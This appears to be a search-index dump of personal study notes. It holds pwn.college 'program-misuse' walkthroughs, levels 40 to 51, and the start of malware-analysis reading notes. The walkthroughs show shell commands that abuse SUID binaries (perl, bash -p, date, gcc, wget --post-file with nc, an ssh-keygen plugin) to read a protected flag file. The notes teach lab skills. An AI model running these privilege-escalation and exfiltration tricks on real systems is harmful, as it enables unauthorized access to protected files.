\u5982\u679c\u6211\u4eec\u5728\u547d\u4ee4\u4e4b\u4e2d\u4e0d\u4f7f\u7528\u7ba1\u9053\u800c\u4f7f\u7528\u91cd\u5b9a\u5411\uff08\u8fd9\u662f\u65b0\u624b\u53ef\u80fd\u4f1a\u72af\u7684\u9519\u8bef\uff09\u90a3\u4e48\u524d\u4e00\u4e2a\u8f93\u51fa\u4f1a\u91cd\u5199\u5230\u540e\u9762\u7684\u547d\u4ee4\u4e4b\u4e2d\u9020\u6210\u6df7\u4e71\uff0c\u6bd4\u5982 cat /flag > more","title":"level40 Lets you get the flag by doing tricks with permissions!"},{"location":"CSE466/program-misuse/#level41-lets-you-read-the-flag-because-they-let-you-program-anything","text":"hacker@program-misuse-level-41:~$ sh file.sh Welcome to ./babysuid_level41! This challenge is part of a series of programs that let you read the flag because they let you program anything. I just set the SUID bit on /usr/bin/perl. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level41) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/perl! perl \u662f\u4e2a\u811a\u672c\u89e3\u91ca\u5668\uff0c hacker@program-misuse-level-41:~$ perl -ne \"print if pwn.college\" /flag perl: warning: Setting locale failed. perl: warning: Please check that your locale settings: LANGUAGE = (unset), LC_ALL = (unset), LC_CTYPE = \"C.UTF-8\", LANG = \"en_US.UTF-8\" are supported and installed on your system. perl: warning: Falling back to the standard locale (\"C\"). pwn.college{s8g_u7MkHNRfph-Yrrslj2vzKUJ.01M4EDL2QjMyMzW} hacker@program-misuse-level-41:~$ \u6253\u5370\u6709pen.college\u7684\u884c","title":"level41 Lets you read the flag because they let you program anything!"},{"location":"CSE466/program-misuse/#level42-lets-you-read-the-flag-because-they-let-you-program-anything","text":"hacker@program-misuse-level-42:~$ sh file.sh Welcome to ./babysuid_level42! This challenge is part of a series of programs that let you read the flag because they let you program anything. I just set the SUID bit on /usr/bin/python. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level42) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/python! \u4f7f\u7528python >>> with open(\"/flag\",\"r\") as f: ... print(f.read()) ... pwn.college{kTtv9lYtW7yK8dnUSvApk5Yv1s-.0FN4EDL2QjMyMzW} >>>","title":"level42 Lets you read the flag because they let you program anything!"},{"location":"CSE466/program-misuse/#level43-lets-you-read-the-flag-because-they-let-you-program-anything","text":"hacker@program-misuse-level-43:~$ sh file.sh Welcome to ./babysuid_level43! This challenge is part of a series of programs that let you read the flag because they let you program anything. I just set the SUID bit on /usr/bin/ruby. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level43) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/ruby! \u7528ruby\u5199\u811a\u672c # \u6253\u5f00\u6587\u4ef6 File.open('/flag', 'r') do |f| # \u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9 content = f.read # \u8f93\u51fa\u6587\u4ef6\u5185\u5bb9 puts content end hacker@program-misuse-level-43:~$ ruby level43.rb pwn.college{smGb0PfTvxp0__6HgKHsucNW2Pg.0VN4EDL2QjMyMzW} hacker@program-misuse-level-43:~$","title":"level43 Lets you read the flag because they let you program anything!"},{"location":"CSE466/program-misuse/#level44-lets-you-read-the-flag-because-they-let-you-program-anything","text":"hacker@program-misuse-level-44:~$ sh file.sh Welcome to ./babysuid_level44! This challenge is part of a series of programs that let you read the flag because they let you program anything. I just set the SUID bit on /usr/bin/bash. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level44) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/bash! bash\uff0c\u53c2\u7167\u4e4b\u524d\u7684\u9898\u62ff\u5230\u63d0\u793a\u7b26 hacker@program-misuse-level-44:~$ bash -p bash-5.0# cat /flag pwn.college{wsQ6idwZWBnJ7doJInQhvY0hBVg.0lN4EDL2QjMyMzW} bash-5.0#","title":"level44 Lets you read the flag because they let you program anything!"},{"location":"CSE466/program-misuse/#level45-just-straight-up-wasnt-designed-to-let-you-read-files","text":"hacker@program-misuse-level-45:~$ sh file.sh Welcome to ./babysuid_level45! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/date. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level45) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/date! \u624b\u518c\u91cc\u5199\u4e86-f\u8bfb\u6587\u4ef6 hacker@program-misuse-level-45:~$ date -f /flag date: invalid date 'pwn.college{E0wTS_9vWAv5Z6QWVWGpaHKER5P.01N4EDL2QjMyMzW}' hacker@program-misuse-level-45:~$","title":"level45 Just straight up wasn't designed to let you read files!"},{"location":"CSE466/program-misuse/#level46-just-straight-up-wasnt-designed-to-let-you-read-files","text":"hacker@program-misuse-level-46:~$ sh file.sh Welcome to ./babysuid_level46! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/dmesg. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level46) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/dmesg! \u663e\u793a\u5f00\u673a\u65f6\u95f4\u4e4b\u7c7b\u7684\u4e1c\u897f hacker@program-misuse-level-46:~$ dmesg -F /flag [ 0.000000] pwn.college{Q8U4rT5_srr0BlLq1ZlDOJx0yDe.0FO4EDL2QjMyMzW} hacker@program-misuse-level-46:~$ \u90fd\u662f\u770b\u624b\u518c","title":"level46 Just straight up wasn't designed to let you read files!"},{"location":"CSE466/program-misuse/#level47-just-straight-up-wasnt-designed-to-let-you-read-files","text":"hacker@program-misuse-level-47:~$ sh file.sh Welcome to ./babysuid_level47! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/wc. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level47) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/wc! wc \u4e00\u822c\u7528\u4e8e\u7edf\u8ba1\u884c\u53f7\u3001\u5b57\u6570\u4ec0\u4e48\u7684\u3002 hacker@program-misuse-level-47:~$ wc --files0-from=/flag wc: 'pwn.college{shy1dFSZ2LmpPnQ-OAl_RoDeLxh.0VO4EDL2QjMyMzW}'$'\\n': No such file or directory hacker@program-misuse-level-47:~$ \u4ece\u624b\u518c\u6765\u770b\u5c31\u4e0a\u9762\u8fd9\u4e2a\u4e0d\u662f\u7edf\u8ba1\u6570\u91cf\u7684\uff0c\u56e0\u6b64\u5c31\u5b83\u4e86\uff01","title":"level47 Just straight up wasn't designed to let you read files!"},{"location":"CSE466/program-misuse/#level48-just-straight-up-wasnt-designed-to-let-you-read-files","text":"hacker@program-misuse-level-48:~$ sh file.sh Welcome to ./babysuid_level48! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/gcc. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level48) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/gcc! \u6709\u70b9\u513f\u610f\u601d\uff0cgcc\u90fd\u51fa\u6765\u4e86 hacker@program-misuse-level-48:~$ gcc -x c -E /flag # 1 \"/flag\" # 1 \"<built-in>\" # 1 \"<command-line>\" # 31 \"<command-line>\" # 1 \"/usr/include/stdc-predef.h\" 1 3 4 # 32 \"<command-line>\" 2 # 1 \"/flag\" pwn.college{UgtHTJRU8raItcJF89PS-hM7Rh9.0FM5EDL2QjMyMzW} hacker@program-misuse-level-48:~$ \u5b83\u8fd9\u4e2a\u5fc5\u987b\u8981\u6307\u5b9a\u8bed\u8a00\uff0c\u4e0d\u7136\u4e0d\u80fd\u8fd0\u884c ///@TODO: \u8fd9\u4e2a\u4e00\u5b9a\u8981\u53bb\u770b\u5b98\u65b9\u89e3\u7b54\uff0c\u76f4\u63a5\u5728\u4e00\u4e2a\u7a0b\u5e8f\u91cc\u9762include '/flag'\uff0c\u7136\u540e\u9760\u62a5\u9519\u5f97\u5230flag\uff0c\u975e\u5e38\u6709\u542f\u53d1","title":"level48 Just straight up wasn't designed to let you read files!"},{"location":"CSE466/program-misuse/#level49-just-straight-up-wasnt-designed-to-let-you-read-files","text":"hacker@program-misuse-level-49:~$ sh file.sh Welcome to ./babysuid_level49! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/as. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level49) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/as! as :\u6c47\u7f16\u8bed\u8a00\u7684\u7f16\u8bd1\u5668 hacker@program-misuse-level-49:~$ as -g /flag /flag: Assembler messages: /flag:1: Error: no such instruction: `pwn.college{MqHCh7Oprd3rEP2f1i_RgAl8QZR.0VM5EDL2QjMyMzW}' hacker@program-misuse-level-49:~$ \u901a\u8fc7\u8c03\u8bd5\u8f93\u51fa","title":"level49 Just straight up wasn't designed to let you read files!"},{"location":"CSE466/program-misuse/#level50-just-straight-up-wasnt-designed-to-let-you-read-files","text":"hacker@program-misuse-level-50:~$ sh file.sh Welcome to ./babysuid_level50! This challenge is part of a series of programs that just straight up weren't designed to let you read files. I just set the SUID bit on /usr/bin/wget. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level50) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/wget! wget :\u4e0b\u8f7d\u5668 hacker@program-misuse-level-50:~$ nc -lp 8888 & wget --post-file=/flag http://127.0.0.1:8888 [1] 5873 --2023-07-22 13:39:17-- http://127.0.0.1:8888/ Connecting to 127.0.0.1:8888... connected. POST / HTTP/1.1 User-Agent: Wget/1.20.3 (linux-gnu) Accept: */* Accept-Encoding: identity Host: 127.0.0.1:8888 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Content-Length: 57 HTTP request sent, awaiting response... pwn.college{M8oJZxXsT1hCl5_WCWqpA-ITlJZ.0lM5EDL2QjMyMzW} \u6709\u4e2a\u53eb\u6587\u4ef6\u4e0a\u4f20\u7684\u529f\u80fd\uff0c\u8fd9\u4e2a\u770b\u4e86\u4e00\u4e2a\u522b\u4eba\u7684\u7b54\u6848","title":"level50 Just straight up wasn't designed to let you read files!"},{"location":"CSE466/program-misuse/#level51-shows-how-dangerous-it-is-to-allow-users-to-load-their-own-code-as-plugins-into-the-program-but-figuring-out-how-is-the-hard-part","text":"hacker@program-misuse-level-51:~$ sh file.sh Welcome to ./babysuid_level51! This challenge is part of a series of programs that show you how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part!). I just set the SUID bit on /usr/bin/ssh-keygen. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level51) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/ssh-keygen! \u8fd9\u4e2a\u6211\u662f\u4e00\u70b9\u513f\u90fd\u4e0d\u4f1a\uff0c\u770b\u4e86\u4e00\u4e0b\u8bb2\u89e3\u624d\u660e\u767d\uff0cG \u8fd9\u4e2a\u5c31\u662f\u5199\u4e00\u4e2aC/C++\u7a0b\u5e8f\uff0c\u91cc\u9762\u8981\u6709C_GetFunctionList\u8fd9\u4e2a\u51fd\u6570\uff0c\u7136\u540e\u7528sendfile\u6765open\u6587\u4ef6\u3002 \u7136\u540e\u4f7f\u7528gcc\u7f16\u8bd1\u6210.so\u6587\u4ef6\uff0c\u6700\u540e\u4f7f\u7528ssh-keygen -D\u5373\u53ef\u3002 hacker@program-misuse-level-51:~$ ssh-keygen -D ./level51.so pwn.college{koI1pFWalnNHyjlN_NQ4CLcsasT.01M5EDL2QjMyMzW} C_GetFunctionList for provider ./level51.so failed: 57 cannot read public key from pkcs11 hacker@program-misuse-level-51:~$","title":"level51 Shows how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part)!"},{"location":"CSE466/program-misuse/#_2","text":"\u5173\u4e8emv \u90a3\u5757\u513f\u7684\uff0c[\u4e00\u4e2a\u535a\u5ba2]\uff08https://medium.com/workindia-in/the-dark-side-of-mv-command-3419c1bd619\uff09 \u6700\u540e\u4e00\u4e2a\u9898\u7684 \u8bb2\u89e3 ,\u8fd9\u73a9\u610f\u513f\u4e0d\u8bb2\u662f\u771f\u4e0d\u4f1a\uff0c\u592a\u83dc\u4e86","title":"\u503c\u5f97\u8bb0\u5f55\u7684\u5185\u5bb9"},{"location":"MalwareAnalysis/READMD/","text":"\u300a\u6076\u610f\u4ee3\u7801\u5206\u6790\u5b9e\u6218\u300b\u9605\u8bfb\u7b14\u8bb0 \u8fd9\u672c\u4e66\u5728\u8bfe\u4e0a\u5b66\u8fc7\uff0c\u53ef\u60dc\u5f53\u65f6\u8bb2\u7684\u592a\u6d45\uff0c\u56e0\u6b64\u73b0\u5728\u91cd\u65b0\u5f00\u59cb\u5b66\u4e60\u8fd9\u4e9b\u5185\u5bb9\uff0c\u5e76\u5e0c\u671b\u53ef\u4ee5\u5728\u5b66\u4e60\u7684\u8fc7\u7a0b\u4e4b\u4e2d\u4f7f\u7528\u8fd9\u4e9b\u5185\u5bb9\u81ea\u5df1\u7f16\u5199\u4e00\u4e9b\u7b80\u5355\u7684\u3001\u5c0f\u7684\u75c5\u6bd2\u3002","title":"ABOUT MalwareAnalysis"},{"location":"MalwareAnalysis/READMD/#_1","text":"\u8fd9\u672c\u4e66\u5728\u8bfe\u4e0a\u5b66\u8fc7\uff0c\u53ef\u60dc\u5f53\u65f6\u8bb2\u7684\u592a\u6d45\uff0c\u56e0\u6b64\u73b0\u5728\u91cd\u65b0\u5f00\u59cb\u5b66\u4e60\u8fd9\u4e9b\u5185\u5bb9\uff0c\u5e76\u5e0c\u671b\u53ef\u4ee5\u5728\u5b66\u4e60\u7684\u8fc7\u7a0b\u4e4b\u4e2d\u4f7f\u7528\u8fd9\u4e9b\u5185\u5bb9\u81ea\u5df1\u7f16\u5199\u4e00\u4e9b\u7b80\u5355\u7684\u3001\u5c0f\u7684\u75c5\u6bd2\u3002","title":"\u300a\u6076\u610f\u4ee3\u7801\u5206\u6790\u5b9e\u6218\u300b\u9605\u8bfb\u7b14\u8bb0"},{"location":"MalwareAnalysis/Lab/lab1/","text":"","title":"lab1"},{"location":"MalwareAnalysis/knowledge/ch0/","text":"The Goals of Malware Analysis \u786e\u5b9a\u5230\u5e95\u53d1\u751f\u4e86\u4ec0\u4e48 \u786e\u4fdd\u80fd\u591f\u5b9a\u4f4d\u51fa\u6240\u6709\u53d7\u611f\u67d3\u7684\u4e3b\u673a\u548c\u6587\u4ef6 \u89e3\u5228\u53ef\u7591\u6587\u4ef6 \u627e\u51fa\u53ef\u7528\u4e8e\u68c0\u6d4b\u7684\u7279\u5f81\u7801 \u57fa\u4e8e\u673a\u5668\u5b66\u4e60\u6784\u5efa\u68c0\u6d4b\u7cfb\u7edf \u5982\u4f55\u68c0\u6d4b\u5e76\u63a7\u5236\u635f\u5bb3 Signatures \u7279\u5f81\u7801 Identify files or registry keys on a victim computer that indicate an infection Focus on what the malware did to the system, not the malware itself Different from antivirus signatures \u53c8\u79f0\u4e3a\u611f\u67d3\u8ff9\u8c61\uff0c\u7528\u4e8e\u5728\u53d7\u611f\u67d3\u4e3b\u673a\u4e0a\u68c0\u6d4b\u51fa\u6076\u610f\u4ee3\u7801\u3002 \u7ecf\u5e38\u662f\u6076\u610f\u4ee3\u7801\u6240\u521b\u5efa\u6216\u4fee\u6539\u7684\u6587\u4ef6\uff0c\u6216\u662f\u5bf9\u6ce8\u518c\u8868\u7684\u7279\u5b9a\u4fee\u6539\u3002 \u4e0e\u53cd\u75c5\u6bd2\u8f6f\u4ef6\u6240\u4f7f\u7528\u7684\u75c5\u6bd2\u7279\u5f81\u7801\u4e0d\u540c \u6076\u610f\u4ee3\u7801\u7684\u611f\u67d3\u8ff9\u8c61\u5173\u6ce8\u7684\u662f\u6076\u610f\u4ee3\u7801\u5bf9\u7cfb\u7edf\u505a\u4e86\u4ec0\u4e48 \u6076\u610f\u4ee3\u7801\u7684\u75c5\u6bd2\u7279\u5f81\u7801\u5173\u6ce8\u7684\u662f\u6076\u610f\u4ee3\u7801\u672c\u8eab\u7684\u7279\u6027\u3002 \u6709\u65f6\u611f\u67d3\u8ff9\u8c61\u66f4\u52a0\u6709\u6548\uff0c\u6bd4\u5982\u68c0\u6d4b\u90a3\u4e9b\u7ecf\u5e38\u53d8\u5316\u81ea\u8eab\u5f62\u6001\u7684\u591a\u6001\u6027\u6076\u610f\u4ee3\u7801\uff0c\u6216\u8005\u6076\u610f\u4ee3\u7801\u5df2\u7ecf\u5c06\u81ea\u8eab\u6587\u4ef6\u4ece\u786c\u76d8\u4e2d\u5220\u9664\u3002 Network signatures \u57fa\u4e8e\u7f51\u7edc\u7684\u7279\u5f81\u7801 Detect malware by analyzing network traffic More effective when made using malware analysis \u901a\u8fc7\u76d1\u6d4b\u7f51\u7edc\u6d41\u91cf\u6765\u68c0\u6d4b\u6076\u610f\u4ee3\u7801 \u5728\u6076\u610f\u4ee3\u7801\u5206\u6790\u5e2e\u52a9\u4e0b\u63d0\u53d6\u7684\u57fa\u4e8e\u7f51\u7edc\u7684\u7279\u5f81\u7801\u5f80\u5f80\u662f\u66f4\u52a0\u6709\u6548\u7684\uff0c\u6709\u66f4\u9ad8\u7684\u68c0\u6d4b\u7387\u548c\u66f4\u5c11\u7684\u8bef\u62a5 \u4e24\u79cd\u65b9\u6cd5 \u9759\u6001\u3001\u52a8\u6001 \u800c\u8fd9\u4e24\u79cd\u4e4b\u4e2d\u53c8\u5206\u4e3a\u57fa\u7840\u6280\u672f\u548c\u9ad8\u7ea7\u6280\u672f\uff0c\u9ad8\u7ea7\u6280\u672f\u5c31\u662f\u6307\u9006\u5411\u3001\u8c03\u8bd5\u7b49\u5185\u5bb9\u3002 \u6076\u610f\u4ee3\u7801\u7684\u7c7b\u578b Backdoor\u540e\u95e8 Allows attacker to control the system \u6076\u610f\u4ee3\u7801\u5c06\u81ea\u8eab\u5b89\u88c5\u5230\u4e00\u53f0\u8ba1\u7b97\u673a\u6765\u5141\u8bb8\u653b\u51fb\u8005\u8bbf\u95ee Botnet \u50f5\u5c38\u7f51\u7edc All infected computers receive instructions from the same Command-and-Control (C&C) server \u6240\u6709\u88ab\u540c\u4e00\u4e2a\u50f5\u5c38\u7f51\u7edc\u611f\u67d3\u7684\u8ba1\u7b97\u673a\u5c06\u4f1a\u4ece\u4e00\u53f0\u63a7\u5236\u547d\u4ee4\u670d\u52a1\u5668\u63a5\u6536\u5230\u76f8\u540c\u7684\u547d\u4ee4\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u8bbf\u95ee\u7cfb\u7edf Downloader \u4e0b\u8f7d\u5668 Malicious code that exists only to download other malicious code Used when attacker first gains access \u53ea\u662f\u7528\u6765\u4e0b\u8f7d\u5176\u4ed6\u6076\u610f\u4ee3\u7801\u7684\u6076\u610f\u4ee3\u7801 \u901a\u5e38\u662f\u5728\u653b\u51fb\u8005\u83b7\u5f97\u7cfb\u7edf\u7684\u8bbf\u95ee\u65f6\u9996\u5148\u8fdb\u884c\u5b89\u88c5\u7684 Information-stealing malware \u95f4\u8c0d\u8f6f\u4ef6 Sniffers, keyloggers, password hash grabbers \u4ece\u53d7\u5bb3\u8ba1\u7b97\u673a\u4e0a\u6536\u96c6\u4fe1\u606f\u5e76\u53d1\u9001\u7ed9\u653b\u51fb\u8005 \u6bd4\u5982\uff1a\u55c5\u63a2\u5668\u3001\u5bc6\u7801\u54c8\u5e0c\u91c7\u96c6\u5668\u3001\u952e\u76d8\u8bb0\u5f55\u5668\u7b49\u3002 Launcher \u542f\u52a8\u5668 Malicious program used to launch other malicious programs Often uses nontraditional techniques to ensure stealth or greater access to a system \u7528\u6765\u542f\u52a8\u5176\u4ed6\u6076\u610f\u7a0b\u5e8f\u7684\u6076\u610f\u4ee3\u7801 \u901a\u5e38\u4f7f\u7528\u4e00\u4e9b\u975e\u4f20\u7edf\u7684\u6280\u672f\u6765\u542f\u52a8\u5176\u4ed6\u6076\u610f\u7a0b\u5e8f\uff0c\u4ee5\u786e\u4fdd\u5176\u9690\u853d\u6027\uff0c\u6216\u8005\u4ee5\u66f4\u9ad8\u6743\u9650\u8bbf\u95ee\u7cfb\u7edf\u3002 Rootkit\u5185\u6838\u5957\u4ef6 Malware that conceals the existence of other code Usually paired with a backdoor \u7528\u6765\u9690\u85cf\u5176\u4ed6\u6076\u610f\u4ee3\u7801\u7684\u6076\u610f\u4ee3\u7801 \u901a\u5e38\u662f\u4e0e\u5176\u4ed6\u6076\u610f\u4ee3\u7801\uff08\u5982\u540e\u95e8\uff09\u7ec4\u5408\u6210\u5de5\u5177\u5957\u88c5\uff0c\u6765\u5141\u8bb8\u4e3a\u653b\u51fb\u8005\u63d0\u4f9b\u8fdc\u7a0b\u8bbf\u95ee Scareware \u6050\u5413\u8f6f\u4ef6\uff08\u52d2\u7d22\u8f6f\u4ef6\uff1f\uff09 Frightens user into buying something \u52d2\u7d22\u7528\u6237\u8d2d\u4e70\u67d0\u4e9b\u4e1c\u897f\u7684\u6076\u610f\u4ee3\u7801 \u901a\u5e38\u6709\u4e00\u4e2a\u7528\u6237\u754c\u9762\uff0c\u4f7f\u5f97\u5b83\u770b\u8d77\u6765\u50cf\u662f\u4e00\u4e2a\u6740\u6bd2\u8f6f\u4ef6\u6216\u5176\u4ed6\u5b89\u5168\u7a0b\u5e8f\u3002\u5b83\u4f1a\u901a\u77e5\u7528\u6237\u7cfb\u7edf\u4e2d\u5b58\u5728\u6076\u610f\u4ee3\u7801\uff0c\u800c\u552f\u4e00\u9664\u6389\u5b83\u4eec\u7684\u65b9\u6cd5\u53ea\u6709\u8d2d\u4e70\u4ed6\u4eec\u7684\u201c\u8f6f\u4ef6\u201d\uff0c\u800c\u4e8b\u5b9e\u4e0a\uff0c\u4ed6\u4eec\u6240\u5356\u8f6f\u4ef6\u7684\u5168\u90e8\u529f\u80fd\u53ea\u4e0d\u8fc7\u662f\u5c06\u52d2\u7d22\u8f6f\u4ef6\u8fdb\u884c\u79fb\u9664\u800c\u5df1\u3002 Spam-sending malware \u53d1\u9001\u5783\u573e\u90ae\u4ef6\u7684\u6076\u610f\u4ee3\u7801 Attacker rents machine to spammers \u901a\u8fc7\u4e3a\u653b\u51fb\u8005\u51fa\u552e\u5783\u573e\u90ae\u4ef6\u53d1\u9001\u670d\u52a1\u800c\u83b7\u5f97\u6536\u76ca Worms or viruses \u8815\u866b\u6216\u75c5\u6bd2 Malicious code that can copy itself and infect additional computers \u53ef\u4ee5\u590d\u5236\u81ea\u8eab\u5e76\u611f\u67d3\u5176\u4ed6\u8ba1\u7b97\u673a\u7684\u6076\u610f\u4ee3\u7801 Ransomware \u52d2\u7d22\u8f6f\u4ef6 encrypt victim's data as hostage ask for ransom to recover the data \u5c06\u53d7\u5bb3\u8005\u7684\u6570\u636e\u52a0\u5bc6\u4e3a\u4eba\u8d28 \u52d2\u7d22\u8d22\u7269\u540e\u624d\u6062\u590d\u6570\u636e Mass v. Targeted Malware Mass malware \u5927\u4f17\u6027\u6076\u610f\u4ee3\u7801 Intended to infect as many machines as possible Most common type \u8bbe\u8ba1\u4e3a\u5f71\u54cd\u5230\u5c3d\u53ef\u80fd\u591a\u7684\u673a\u5668 \u6700\u4e3a\u666e\u904d Targeted malware \u9488\u5bf9\u6027\u6076\u610f\u4ee3\u7801 APT(Advanced Persistent Threat)\uff1a\u9ad8\u7ea7\u6301\u7eed\u6027\u5a01\u80c1\uff0c\u672c\u8d28\u662f\u9488\u5bf9\u6027\u653b\u51fb Tailored to a specific target Very difficult to detect, prevent, and remove Requires advanced analysis Ex: Stuxnet \u9488\u5bf9\u7279\u5b9a\u7ec4\u7ec7\u800c\u7814\u5236\u7684 \u5f88\u96be\u68c0\u6d4b\uff0c\u9632\u6b62\u548c\u79fb\u9664 \u9700\u8981\u9ad8\u7ea7\u5206\u6790 \u9707\u7f51\u75c5\u6bd2","title":"ch0"},{"location":"MalwareAnalysis/knowledge/ch0/#the-goals-of-malware-analysis","text":"\u786e\u5b9a\u5230\u5e95\u53d1\u751f\u4e86\u4ec0\u4e48 \u786e\u4fdd\u80fd\u591f\u5b9a\u4f4d\u51fa\u6240\u6709\u53d7\u611f\u67d3\u7684\u4e3b\u673a\u548c\u6587\u4ef6 \u89e3\u5228\u53ef\u7591\u6587\u4ef6 \u627e\u51fa\u53ef\u7528\u4e8e\u68c0\u6d4b\u7684\u7279\u5f81\u7801 \u57fa\u4e8e\u673a\u5668\u5b66\u4e60\u6784\u5efa\u68c0\u6d4b\u7cfb\u7edf \u5982\u4f55\u68c0\u6d4b\u5e76\u63a7\u5236\u635f\u5bb3","title":"The Goals of Malware Analysis"},{"location":"MalwareAnalysis/knowledge/ch0/#signatures","text":"Identify files or registry keys on a victim computer that indicate an infection Focus on what the malware did to the system, not the malware itself Different from antivirus signatures \u53c8\u79f0\u4e3a\u611f\u67d3\u8ff9\u8c61\uff0c\u7528\u4e8e\u5728\u53d7\u611f\u67d3\u4e3b\u673a\u4e0a\u68c0\u6d4b\u51fa\u6076\u610f\u4ee3\u7801\u3002 \u7ecf\u5e38\u662f\u6076\u610f\u4ee3\u7801\u6240\u521b\u5efa\u6216\u4fee\u6539\u7684\u6587\u4ef6\uff0c\u6216\u662f\u5bf9\u6ce8\u518c\u8868\u7684\u7279\u5b9a\u4fee\u6539\u3002 \u4e0e\u53cd\u75c5\u6bd2\u8f6f\u4ef6\u6240\u4f7f\u7528\u7684\u75c5\u6bd2\u7279\u5f81\u7801\u4e0d\u540c \u6076\u610f\u4ee3\u7801\u7684\u611f\u67d3\u8ff9\u8c61\u5173\u6ce8\u7684\u662f\u6076\u610f\u4ee3\u7801\u5bf9\u7cfb\u7edf\u505a\u4e86\u4ec0\u4e48 \u6076\u610f\u4ee3\u7801\u7684\u75c5\u6bd2\u7279\u5f81\u7801\u5173\u6ce8\u7684\u662f\u6076\u610f\u4ee3\u7801\u672c\u8eab\u7684\u7279\u6027\u3002 \u6709\u65f6\u611f\u67d3\u8ff9\u8c61\u66f4\u52a0\u6709\u6548\uff0c\u6bd4\u5982\u68c0\u6d4b\u90a3\u4e9b\u7ecf\u5e38\u53d8\u5316\u81ea\u8eab\u5f62\u6001\u7684\u591a\u6001\u6027\u6076\u610f\u4ee3\u7801\uff0c\u6216\u8005\u6076\u610f\u4ee3\u7801\u5df2\u7ecf\u5c06\u81ea\u8eab\u6587\u4ef6\u4ece\u786c\u76d8\u4e2d\u5220\u9664\u3002 Network signatures \u57fa\u4e8e\u7f51\u7edc\u7684\u7279\u5f81\u7801 Detect malware by analyzing network traffic More effective when made using malware analysis \u901a\u8fc7\u76d1\u6d4b\u7f51\u7edc\u6d41\u91cf\u6765\u68c0\u6d4b\u6076\u610f\u4ee3\u7801 \u5728\u6076\u610f\u4ee3\u7801\u5206\u6790\u5e2e\u52a9\u4e0b\u63d0\u53d6\u7684\u57fa\u4e8e\u7f51\u7edc\u7684\u7279\u5f81\u7801\u5f80\u5f80\u662f\u66f4\u52a0\u6709\u6548\u7684\uff0c\u6709\u66f4\u9ad8\u7684\u68c0\u6d4b\u7387\u548c\u66f4\u5c11\u7684\u8bef\u62a5","title":"Signatures \u7279\u5f81\u7801"},{"location":"MalwareAnalysis/knowledge/ch0/#_1","text":"\u9759\u6001\u3001\u52a8\u6001 \u800c\u8fd9\u4e24\u79cd\u4e4b\u4e2d\u53c8\u5206\u4e3a\u57fa\u7840\u6280\u672f\u548c\u9ad8\u7ea7\u6280\u672f\uff0c\u9ad8\u7ea7\u6280\u672f\u5c31\u662f\u6307\u9006\u5411\u3001\u8c03\u8bd5\u7b49\u5185\u5bb9\u3002","title":"\u4e24\u79cd\u65b9\u6cd5"},{"location":"MalwareAnalysis/knowledge/ch0/#_2","text":"Backdoor\u540e\u95e8 Allows attacker to control the system \u6076\u610f\u4ee3\u7801\u5c06\u81ea\u8eab\u5b89\u88c5\u5230\u4e00\u53f0\u8ba1\u7b97\u673a\u6765\u5141\u8bb8\u653b\u51fb\u8005\u8bbf\u95ee Botnet \u50f5\u5c38\u7f51\u7edc All infected computers receive instructions from the same Command-and-Control (C&C) server \u6240\u6709\u88ab\u540c\u4e00\u4e2a\u50f5\u5c38\u7f51\u7edc\u611f\u67d3\u7684\u8ba1\u7b97\u673a\u5c06\u4f1a\u4ece\u4e00\u53f0\u63a7\u5236\u547d\u4ee4\u670d\u52a1\u5668\u63a5\u6536\u5230\u76f8\u540c\u7684\u547d\u4ee4\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u8bbf\u95ee\u7cfb\u7edf Downloader \u4e0b\u8f7d\u5668 Malicious code that exists only to download other malicious code Used when attacker first gains access \u53ea\u662f\u7528\u6765\u4e0b\u8f7d\u5176\u4ed6\u6076\u610f\u4ee3\u7801\u7684\u6076\u610f\u4ee3\u7801 \u901a\u5e38\u662f\u5728\u653b\u51fb\u8005\u83b7\u5f97\u7cfb\u7edf\u7684\u8bbf\u95ee\u65f6\u9996\u5148\u8fdb\u884c\u5b89\u88c5\u7684 Information-stealing malware \u95f4\u8c0d\u8f6f\u4ef6 Sniffers, keyloggers, password hash grabbers \u4ece\u53d7\u5bb3\u8ba1\u7b97\u673a\u4e0a\u6536\u96c6\u4fe1\u606f\u5e76\u53d1\u9001\u7ed9\u653b\u51fb\u8005 \u6bd4\u5982\uff1a\u55c5\u63a2\u5668\u3001\u5bc6\u7801\u54c8\u5e0c\u91c7\u96c6\u5668\u3001\u952e\u76d8\u8bb0\u5f55\u5668\u7b49\u3002 Launcher \u542f\u52a8\u5668 Malicious program used to launch other malicious programs Often uses nontraditional techniques to ensure stealth or greater access to a system \u7528\u6765\u542f\u52a8\u5176\u4ed6\u6076\u610f\u7a0b\u5e8f\u7684\u6076\u610f\u4ee3\u7801 